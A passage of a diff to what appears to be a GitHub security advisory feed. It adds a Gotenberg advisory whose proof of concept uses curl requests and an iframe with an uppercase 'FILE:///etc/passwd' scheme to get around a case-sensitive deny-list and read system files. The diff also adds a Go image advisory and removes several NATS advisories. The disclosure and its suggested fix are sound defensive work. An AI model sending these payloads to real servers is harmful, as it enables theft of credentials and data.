+<pre><code class="language-bash">docker run --rm -p 3000:3000 gotenberg/gotenberg:8.26.0 gotenberg
+</code></pre>
+<ol start="2">
+<li>Read <code>/etc/passwd</code> via the URL endpoint using an uppercase scheme:</li>
+</ol>
+<pre><code class="language-bash">curl -X POST 'http://localhost:3000/forms/chromium/convert/url' \
+  --form 'url=FILE:///etc/passwd' -o output.pdf
+</code></pre>
+<ol start="3">
+<li><p>Open <code>output.pdf</code> — it contains the contents of <code>/etc/passwd</code>.</p>
+</li>
+<li><p>Alternatively, create an <code>index.html</code>:</p>
+</li>
+</ol>
+<pre><code class="language-html">&lt;iframe src="FILE:///etc/passwd" width="100%" height="100%"&gt;&lt;/iframe&gt;
+</code></pre>
+<p>Then convert it:</p>
+<pre><code class="language-bash">curl -X POST 'http://localhost:3000/forms/chromium/convert/html' \
+  -F 'files=@index.html' -o output.pdf
+</code></pre>
+<ol start="5">
+<li>The resulting PDF contains <code>/etc/passwd</code> contents.</li>
+</ol>
+<p>Mixed-case variants like <code>File:</code>, <code>fILE:</code>, <code>fiLE:</code> etc. all work as well.</p>
+<h3 id="root-cause">Root Cause</h3>
+<ul>
+<li><code>pkg/modules/chromium/chromium.go</code> defines the default deny-list as <code>^file:(?!//\/tmp/).*</code></li>
+<li><code>pkg/gotenberg/filter.go</code> compiles this with <code>regexp2.MustCompile(denied.String(), 0)</code> — flag <code>0</code> means case-sensitive</li>
+<li><code>pkg/modules/chromium/events.go</code> uses <code>FilterDeadline</code> to check intercepted request URLs against the deny-list</li>
+<li>Chromium normalizes URL schemes to lowercase, so <code>FILE:///etc/passwd</code> becomes <code>file:///etc/passwd</code> after the deny-list check has already passed</li>
+</ul>
+<h3 id="suggested-fix">Suggested Fix</h3>
+<p>Change the default deny-list regex to use a case-insensitive flag:</p>
+<pre><code>(?i)^file:(?!//\/tmp/).*
+</code></pre>
+<p>Or apply case-insensitive matching in <code>FilterDeadline</code> when compiling the regex.</p>
+<h3 id="severity">Severity</h3>
+<p>This is effectively the same impact as CVE-2024-21527 — unauthenticated arbitrary file read from the Gotenberg container. An attacker can leak environment variables, configuration, credentials, and other sensitive data.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/gotenberg/gotenberg/security/advisories/GHSA-jjwv-57xh-xr6r">https://github.com/gotenberg/gotenberg/security/advisories/GHSA-jjwv-57xh-xr6r</a></li>
+<li><a href="https://github.com/gotenberg/gotenberg/security/advisories/GHSA-rh2x-ccvw-q7r3">https://github.com/gotenberg/gotenberg/security/advisories/GHSA-rh2x-ccvw-q7r3</a></li>
+<li><a href="https://github.com/gotenberg/gotenberg/commit/06b2b2e10c52b58135edbfe82e94d599eb0c5a11">https://github.com/gotenberg/gotenberg/commit/06b2b2e10c52b58135edbfe82e94d599eb0c5a11</a></li>
+<li><a href="https://github.com/gotenberg/gotenberg/commit/8625a4e899eb75e6fcf46d28394334c7fd79fff5">https://github.com/gotenberg/gotenberg/commit/8625a4e899eb75e6fcf46d28394334c7fd79fff5</a></li>
+<li><a href="https://github.com/gotenberg/gotenberg/releases/tag/v8.29.0">https://github.com/gotenberg/gotenberg/releases/tag/v8.29.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-jjwv-57xh-xr6r">https://github.com/advisories/GHSA-jjwv-57xh-xr6r</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-jjwv-57xh-xr6r</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-03-30T16:16:07.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[golang.org/x/image] Go Images vulnerable to an out-of-memory error via a crafted TIFF file]]></title>
+        <id>https://github.com/advisories/GHSA-44p7-9xx4-hf2g</id>
+        <link href="https://github.com/advisories/GHSA-44p7-9xx4-hf2g"/>
+        <updated>2026-03-30T16:11:32.000Z</updated>
+        <content type="html"><![CDATA[<p>A maliciously crafted TIFF file can cause image decoding to attempt to allocate up 4GiB of memory, causing either excessive resource consumption or an out-of-memory error.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33809">https://nvd.nist.gov/vuln/detail/CVE-2026-33809</a></li>
+<li><a href="https://go.dev/cl/757660">https://go.dev/cl/757660</a></li>
+<li><a href="https://go.dev/issue/78267">https://go.dev/issue/78267</a></li>
+<li><a href="https://pkg.go.dev/vuln/GO-2026-4815">https://pkg.go.dev/vuln/GO-2026-4815</a></li>
+<li><a href="https://github.com/advisories/GHSA-44p7-9xx4-hf2g">https://github.com/advisories/GHSA-44p7-9xx4-hf2g</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-44p7-9xx4-hf2g</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-03-25T21:30:35.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/QuantumNous/new-api] New API has passkey-based secure step-up verification bypass for root-only channel secret disclosure]]></title>
         <id>https://github.com/advisories/GHSA-5353-f8fq-65vc</id>
@@ -886,210 +1467,5 @@ EOF
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-03-24T21:49:34.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/nats-io/nats-server] NATS: Leafnode connections allow spoofing of Nats-Request-Info identity headers]]></title>
-        <id>https://github.com/advisories/GHSA-55h8-8g96-x4hj</id>
-        <link href="https://github.com/advisories/GHSA-55h8-8g96-x4hj"/>
-        <updated>2026-03-27T22:10:09.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="background">Background</h3>
-<p>NATS.io is a high performance open source pub-sub distributed communication technology, built for the cloud, on-premise, IoT, and edge computing.</p>
-<p>The nats-server allows hub/spoke topologies using "leafnode" connections by other nats-servers.  NATS messages can have headers.</p>
-<h3 id="problem-description">Problem Description</h3>
-<p>The nats-server offers a <code>Nats-Request-Info:</code> message header, providing information about a request.  This is supposed to provide enough information to allow for account/user identification, such that NATS clients could make their own decisions on how to trust a message, provided that they trust the nats-server as a broker.</p>
-<p>A leafnode connecting to a nats-server is not fully trusted unless the system account is bridged too.  Thus identity claims should not have propagated unchecked.</p>
-<p>Thus NATS clients relying upon the Nats-Request-Info: header could be spoofed.</p>
-<p>Does not directly affect the nats-server itself, but the CVSS Confidentiality and Integrity scores are based upon what a hypothetical client might choose to do with this NATS header.</p>
-<h3 id="affected-versions">Affected Versions</h3>
-<p>Any version before v2.12.6 or v2.11.15</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>None.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/nats-io/nats-server/security/advisories/GHSA-55h8-8g96-x4hj">https://github.com/nats-io/nats-server/security/advisories/GHSA-55h8-8g96-x4hj</a></li>
-<li><a href="https://advisories.nats.io/CVE/secnote-2026-08.txt">https://advisories.nats.io/CVE/secnote-2026-08.txt</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33246">https://nvd.nist.gov/vuln/detail/CVE-2026-33246</a></li>
-<li><a href="https://github.com/advisories/GHSA-55h8-8g96-x4hj">https://github.com/advisories/GHSA-55h8-8g96-x4hj</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-55h8-8g96-x4hj</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-03-24T21:50:25.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/nats-io/nats-server] NATS  is vulnerable to pre-auth DoS through WebSockets client service]]></title>
-        <id>https://github.com/advisories/GHSA-8r68-gvr4-jh7j</id>
-        <link href="https://github.com/advisories/GHSA-8r68-gvr4-jh7j"/>
-        <updated>2026-03-27T22:09:59.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="background">Background</h3>
-<p>NATS.io is a high performance open source pub-sub distributed communication technology, built for the cloud, on-premise, IoT, and edge computing.</p>
-<p>The nats-server offers a WebSockets client service, used in deployments where browsers are the NATS clients.</p>
-<h3 id="problem-description">Problem Description</h3>
-<p>A malicious client which can connect to the WebSockets port can cause unbounded memory use in the nats-server before authentication; this requires sending a corresponding amount of data.</p>
-<p>This is a milder variant of <a href="https://advisories.nats.io/CVE/secnote-2026-02.txt">NATS-advisory-ID 2026-02</a> (aka CVE-2026-27571; GHSA-qrvq-68c2-7grw).
-That earlier issue was a compression bomb, this vulnerability is not. Attacks against this new issue thus require significant client bandwidth.</p>
-<h3 id="affected-versions">Affected Versions</h3>
-<p>Any version before v2.12.6 or v2.11.15</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>Disable websockets if not required for project deployment.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/nats-io/nats-server/security/advisories/GHSA-8r68-gvr4-jh7j">https://github.com/nats-io/nats-server/security/advisories/GHSA-8r68-gvr4-jh7j</a></li>
-<li><a href="https://advisories.nats.io/CVE/secnote-2026-02.txt">https://advisories.nats.io/CVE/secnote-2026-02.txt</a></li>
-<li><a href="https://advisories.nats.io/CVE/secnote-2026-11.txt">https://advisories.nats.io/CVE/secnote-2026-11.txt</a></li>
-<li><a href="https://github.com/advisories/GHSA-qrvq-68c2-7grw">https://github.com/advisories/GHSA-qrvq-68c2-7grw</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33219">https://nvd.nist.gov/vuln/detail/CVE-2026-33219</a></li>
-<li><a href="https://github.com/advisories/GHSA-8r68-gvr4-jh7j">https://github.com/advisories/GHSA-8r68-gvr4-jh7j</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-8r68-gvr4-jh7j</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-03-24T21:46:31.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/nats-io/nats-server] NATS has pre-auth server panic via leafnode handling]]></title>
-        <id>https://github.com/advisories/GHSA-vprv-35vv-q339</id>
-        <link href="https://github.com/advisories/GHSA-vprv-35vv-q339"/>
-        <updated>2026-03-27T22:09:49.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="background">Background</h3>
-<p>NATS.io is a high performance open source pub-sub distributed communication technology, built for the cloud, on-premise, IoT, and edge computing.</p>
-<p>The nats-server allows hub/spoke topologies using "leafnode" connections by other nats-servers.</p>
-<h3 id="problem-description">Problem Description</h3>
-<p>A client which can connect to the leafnode port can crash the nats-server with a certain malformed message pre-authentication.</p>
-<h3 id="affected-versions">Affected Versions</h3>
-<p>Any version before v2.12.6 or v2.11.15</p>
-<h3 id="workarounds">Workarounds</h3>
-<ol>
-<li>Disable leafnode support if not needed.</li>
-<li>Restrict network connections to your leafnode port, if plausible without compromising the service offered.</li>
-</ol>
-<h3 id="references">References</h3>
-<ul>
-<li>This document is canonically: <a href="https://advisories.nats.io/CVE/secnote-2026-10.txt">https://advisories.nats.io/CVE/secnote-2026-10.txt</a></li>
-<li>GHSA advisory: <a href="https://github.com/nats-io/nats-server/security/advisories/GHSA-vprv-35vv-q339">https://github.com/nats-io/nats-server/security/advisories/GHSA-vprv-35vv-q339</a></li>
-<li>MITRE CVE entry: <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-33218">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-33218</a></li>
-</ul>
-<h3 id="references-1">References</h3>
-<ul>
-<li><a href="https://github.com/nats-io/nats-server/security/advisories/GHSA-vprv-35vv-q339">https://github.com/nats-io/nats-server/security/advisories/GHSA-vprv-35vv-q339</a></li>
-<li><a href="https://advisories.nats.io/CVE/secnote-2026-10.txt">https://advisories.nats.io/CVE/secnote-2026-10.txt</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33218">https://nvd.nist.gov/vuln/detail/CVE-2026-33218</a></li>
-<li><a href="https://github.com/advisories/GHSA-vprv-35vv-q339">https://github.com/advisories/GHSA-vprv-35vv-q339</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-vprv-35vv-q339</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-03-24T21:45:29.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/nats-io/nats-server] NATS allows MQTT clients to bypass ACL checks]]></title>
-        <id>https://github.com/advisories/GHSA-jxxm-27vp-c3m5</id>
-        <link href="https://github.com/advisories/GHSA-jxxm-27vp-c3m5"/>
-        <updated>2026-03-27T22:09:38.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="background">Background</h3>
-<p>NATS.io is a high performance open source pub-sub distributed communication technology, built for the cloud, on-premise, IoT, and edge computing.</p>
-<p>The nats-server provides an MQTT client interface.</p>
-<h3 id="problem-description">Problem Description</h3>
-<p>When using ACLs on message subjects, these ACLs were not applied in the <code>$MQTT.&gt;</code> namespace, allowing MQTT clients to bypass ACL checks for MQTT subjects.</p>
-<h3 id="affected-versions">Affected Versions</h3>
-<p>Any version before v2.12.6 or v2.11.15</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>None.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/nats-io/nats-server/security/advisories/GHSA-jxxm-27vp-c3m5">https://github.com/nats-io/nats-server/security/advisories/GHSA-jxxm-27vp-c3m5</a></li>
-<li><a href="https://advisories.nats.io/CVE/secnote-2026-07.txt">https://advisories.nats.io/CVE/secnote-2026-07.txt</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33217">https://nvd.nist.gov/vuln/detail/CVE-2026-33217</a></li>
-<li><a href="https://github.com/advisories/GHSA-jxxm-27vp-c3m5">https://github.com/advisories/GHSA-jxxm-27vp-c3m5</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-jxxm-27vp-c3m5</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-03-24T21:44:17.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/nats-io/nats-server] NATS has MQTT plaintext password disclosure]]></title>
-        <id>https://github.com/advisories/GHSA-v722-jcv5-w7mc</id>
-        <link href="https://github.com/advisories/GHSA-v722-jcv5-w7mc"/>
-        <updated>2026-03-27T22:09:29.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="background">Background</h3>
-<p>NATS.io is a high performance open source pub-sub distributed communication technology, built for the cloud, on-premise, IoT, and edge computing.</p>
-<p>The nats-server provides an MQTT client interface.</p>
-<h3 id="problem-description">Problem Description</h3>
-<p>For MQTT deployments using usercodes/passwords: MQTT passwords are incorrectly classified as a non-authenticating identity statement (JWT) and exposed via monitoring endpoints.</p>
-<h3 id="affected-versions">Affected Versions</h3>
-<p>Any version before v2.12.6 or v2.11.15</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>Ensure monitoring end-points are adequately secured.</p>
-<p>Best practice remains to not expose the monitoring endpoint to the Internet or other untrusted network users.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/nats-io/nats-server/security/advisories/GHSA-v722-jcv5-w7mc">https://github.com/nats-io/nats-server/security/advisories/GHSA-v722-jcv5-w7mc</a></li>
-<li><a href="https://github.com/nats-io/nats-server/commit/b5b63cfc35a57075e09c1f57503d31721bed8099">https://github.com/nats-io/nats-server/commit/b5b63cfc35a57075e09c1f57503d31721bed8099</a></li>
-<li><a href="https://advisories.nats.io/CVE/secnote-2026-05.txt">https://advisories.nats.io/CVE/secnote-2026-05.txt</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33216">https://nvd.nist.gov/vuln/detail/CVE-2026-33216</a></li>
-<li><a href="https://github.com/advisories/GHSA-v722-jcv5-w7mc">https://github.com/advisories/GHSA-v722-jcv5-w7mc</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-v722-jcv5-w7mc</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-03-24T21:42:10.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/nats-io/nats-server] NATS Server panic via malicious compression on leafnode port]]></title>
-        <id>https://github.com/advisories/GHSA-52jh-2xxh-pwh6</id>
-        <link href="https://github.com/advisories/GHSA-52jh-2xxh-pwh6"/>
-        <updated>2026-03-27T22:09:23.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="background">Background</h3>
-<p>NATS.io is a high performance open source pub-sub distributed communication technology, built for the cloud, on-premise, IoT, and edge computing.</p>
-<p>When configured to accept leafnode connections (for a hub/spoke topology of multiple nats-servers), then the default configuration allows for negotiating compression; a malicious remote NATS server can trigger a server panic via that compression.</p>
-<h3 id="problem-description">Problem Description</h3>
-<p>If the nats-server has the "leafnode" configuration enabled (not default), then anyone who can connect can crash the nats-server by triggering a panic. This happens pre-authentication and requires that compression be enabled (which it is, by default, when leafnodes are used).</p>
-<p>Context: a NATS server can form various clustering topologies, including local clusters, and superclusters of clusters, but leafnodes allow for separate administrative domains to link together with limited data communication; eg, a server in a moving vehicle might use a local leafnode for agents to connect to, and sync up to a central service as and when available. The leafnode configuration here is where the central server allows other NATS servers to connect into it, almost like regular NATS clients. Documentation examples typically use port 7422 for leafnode communications.</p>
-<h3 id="affected-versions">Affected Versions</h3>
-<p>Version 2, prior to v2.11.14 or v2.12.5</p>
-<h3 id="workarounds">Workarounds</h3>
-<p>Disable compression on the leafnode port:</p>
-<pre><code>leafnodes {
-  port: 7422
-  compression: off
-}
-</code></pre>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/nats-io/nats-server/security/advisories/GHSA-52jh-2xxh-pwh6">https://github.com/nats-io/nats-server/security/advisories/GHSA-52jh-2xxh-pwh6</a></li>
-<li><a href="https://github.com/nats-io/nats-server/commit/a1488de6f2ba6e666aef0f9cce0016f7f167d6a8">https://github.com/nats-io/nats-server/commit/a1488de6f2ba6e666aef0f9cce0016f7f167d6a8</a></li>
-<li><a href="https://advisories.nats.io/CVE/secnote-2026-04.txt">https://advisories.nats.io/CVE/secnote-2026-04.txt</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-29785">https://nvd.nist.gov/vuln/detail/CVE-2026-29785</a></li>
-<li><a href="https://github.com/advisories/GHSA-52jh-2xxh-pwh6">https://github.com/advisories/GHSA-52jh-2xxh-pwh6</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-52jh-2xxh-pwh6</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-03-24T21:29:06.000Z</published>
     </entry>
 </feed>
